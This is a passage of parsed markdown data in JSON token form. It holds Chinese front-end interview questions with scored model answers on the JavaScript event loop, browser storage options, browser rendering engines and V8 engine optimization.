console.log(\'promise2\');\\n});\\n\\nconsole.log(\'script end\');\\n\\n// 结果\\n// script start => Promise => script end => promise1 => promise2 => setTime"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n\\n- **1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n\\n","task":false,"loose":true,"text":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n","tokens":[{"type":"text","raw":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n","text":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","text":" 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","task":false,"loose":true,"text":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","tokens":[{"type":"text","raw":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","text":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","text":" 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","text":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","tokens":[{"type":"text","raw":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","text":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n    执⾏同步代码，这属于宏任务\\n\\n    执⾏栈为空，查询是否有微任务需要执⾏\\n\\n    执⾏所有微任务\\n\\n    必要的话渲染 UI\\n\\n    然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n    执⾏同步代码，这属于宏任务\\n\\n    执⾏栈为空，查询是否有微任务需要执⾏\\n\\n    执⾏所有微任务\\n\\n    必要的话渲染 UI\\n\\n    然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","task":false,"loose":true,"text":"**1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n  执⾏同步代码，这属于宏任务\\n\\n  执⾏栈为空，查询是否有微任务需要执⾏\\n\\n  执⾏所有微任务\\n\\n  必要的话渲染 UI\\n\\n  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","tokens":[{"type":"text","raw":"**1：** 正确的⼀次 Event loop 顺序是这样的：","text":"**1：** 正确的⼀次 Event loop 顺序是这样的：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 正确的⼀次 Event loop 顺序是这样的：","text":" 正确的⼀次 Event loop 顺序是这样的：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏同步代码，这属于宏任务","text":"  执⾏同步代码，这属于宏任务","tokens":[{"type":"text","raw":"  执⾏同步代码，这属于宏任务","text":"  执⾏同步代码，这属于宏任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏栈为空，查询是否有微任务需要执⾏","text":"  执⾏栈为空，查询是否有微任务需要执⾏","tokens":[{"type":"text","raw":"  执⾏栈为空，查询是否有微任务需要执⾏","text":"  执⾏栈为空，查询是否有微任务需要执⾏","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏所有微任务","text":"  执⾏所有微任务","tokens":[{"type":"text","raw":"  执⾏所有微任务","text":"  执⾏所有微任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  必要的话渲染 UI","text":"  必要的话渲染 UI","tokens":[{"type":"text","raw":"  必要的话渲染 UI","text":"  必要的话渲染 UI","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","text":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","tokens":[{"type":"text","raw":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","text":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","text":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","tokens":[{"type":"text","raw":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","text":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 浏览器中常见的存储方式有哪些？\\n\\n","depth":2,"text":"浏览器中常见的存储方式有哪些？","tokens":[{"type":"text","raw":"浏览器中常见的存储方式有哪些？","text":"浏览器中常见的存储方式有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。\\n- **1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。\\n- **1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。\\n- **1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。\\n","task":false,"loose":false,"text":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","tokens":[{"type":"text","raw":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","text":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","text":" Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。\\n","task":false,"loose":false,"text":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","tokens":[{"type":"text","raw":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","text":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","text":" LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。\\n","task":false,"loose":false,"text":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","tokens":[{"type":"text","raw":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","text":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","text":" SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","task":false,"loose":false,"text":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","tokens":[{"type":"text","raw":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","text":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","text":" IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 常见的浏览器内核有哪些？\\n\\n","depth":2,"text":"常见的浏览器内核有哪些？","tokens":[{"type":"text","raw":"常见的浏览器内核有哪些？","text":"常见的浏览器内核有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]\\n- **1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等\\n- **1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]\\n- **1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]\\n","task":false,"loose":false,"text":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","tokens":[{"type":"text","raw":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","text":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","text":"  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等\\n","task":false,"loose":false,"text":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","tokens":[{"type":"text","raw":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","text":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","text":"  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]\\n","task":false,"loose":false,"text":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","tokens":[{"type":"text","raw":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","text":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","text":"  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","task":false,"loose":false,"text":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","tokens":[{"type":"text","raw":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","text":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","text":"  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## V8 引擎如何进行代码优化？\\n\\n","depth":2,"text":"V8 引擎如何进行代码优化？","tokens":[{"type":"text","raw":"V8 引擎如何进行代码优化？","text":"V8 引擎如何进行代码优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（12 分）\\n\\n","depth":4,"text":"解答（12 分）","tokens":[{"type":"text","raw":"解答（12 分）","text":"解答（12 分）","escaped":false}]},{"type":"list","raw":"- V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n  + 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n  + 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n  + 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n  + 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n  + 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n  + 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n  + 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n  + 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n  + 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n  + 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n  + 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n  + 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","task":false,"loose":false,"text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n","text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","tokens":[{"type":"text","raw":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","escaped":false}]},{"type":"list","raw":"+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n","task":false,"loose":false,"text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","tokens":[{"type":"text","raw":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","tokens":[{"type":"text","raw":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","escaped":false}]}]},{"type":"list_item","raw":"+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n","task":false,"loose":false,"text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","tokens":[{"type":"text","raw":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","tokens":[{"type":"text","raw":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","escaped":false}]}]},{"type":"list_item","raw":"+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n","task":false,"loose":false,"text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","tokens":[{"type":"text","raw":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","tokens":[{"type":"text","raw":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","escaped":false}]}]},{"type":"list_item","raw":"+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n","task":false,"loose":false,"text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","tokens":[{"type":"text","raw":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","tokens":[{"type":"text","raw":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","escaped":false}]}]},{"type":"list_item","raw":"+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n","task":false,"loose":false,"text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","tokens":[{"type":"text","raw":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","tokens":[{"type":"text","raw":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","escaped":false}]}]},{"type":"list_item","raw":"+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","task":false,"loose":false,"text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","escaped":false}]}]}]}]}]}]},{"key":"Node","content":"<h1>Node</h1>\\n<h2>1. Nodejs适用于哪些场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 